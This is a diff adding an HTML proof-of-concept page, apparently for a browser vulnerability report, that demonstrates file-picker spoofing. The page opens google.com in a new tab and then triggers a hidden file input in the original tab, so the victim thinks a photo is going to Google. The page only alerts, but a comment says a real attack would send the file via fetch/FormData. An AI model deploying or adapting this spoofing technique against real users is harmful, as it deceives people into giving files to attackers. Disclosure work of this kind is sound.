@@ -1,0 +1,84 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>PoC: File Picker Spoofing via Tab Redirection</title>
+    <style>
+      body {
+        font-family: sans-serif;
+        padding: 2rem;
+        text-align: center;
+        background: #f0f2f5;
+      }
+      .btn {
+        background: #1a73e8;
+        color: white;
+        border: none;
+        padding: 12px 24px;
+        font-size: 1.2rem;
+        border-radius: 8px;
+        cursor: pointer;
+      }
+      .note {
+        margin-top: 2rem;
+        font-size: 0.9rem;
+        color: #555;
+      }
+      input {
+        display: none;
+      }
+    </style>
+  </head>
+  <body>
+    <h2>📸 Upload Photo to Google (Demo)</h2>
+    <p>
+      Click the button below. A new tab will open <strong>google.com</strong>.
+    </p>
+    <p>
+      After that, a file picker dialog will appear
+      <strong>in this tab</strong> (the attacker's page).
+    </p>
+    <p>
+      Victim thinks the file is being uploaded to Google, but it's actually sent
+      to attacker.
+    </p>
+
+    <button class="btn" id="triggerBtn">
+      📤 Tap to upload photo to Google
+    </button>
+
+    <div class="note">
+      ⚠️ PoC for security research only. No file is actually uploaded.
+    </div>
+
+    <input type="file" id="fileInput" style="display: none" />
+
+    <script>
+      const btn = document.getElementById("triggerBtn");
+      const fileInput = document.getElementById("fileInput");
+
+      btn.addEventListener("click", (e) => {
+        // 1. Open a new tab (google.com) – this simulates the trusted site
+        const newTab = window.open("https://www.google.com", "_blank");
+
+        // 2. Trigger file picker dialog in the current (attacker) tab
+        //    Use setTimeout to ensure the new tab is opened first
+        setTimeout(() => {
+          fileInput.click();
+        }, 100);
+
+        // 3. (Optional) handle file selection for demonstration
+        fileInput.onchange = (event) => {
+          const file = event.target.files[0];
+          if (file) {
+            alert(
+              `[PoC] File "${file.name}" would be uploaded to attacker's server.`,
+            );
+            // In a real attack, you would send this file via fetch/FormData
+          }
+          fileInput.value = ""; // reset
+        };
+      });
+    </script>
+  </body>
+</html>
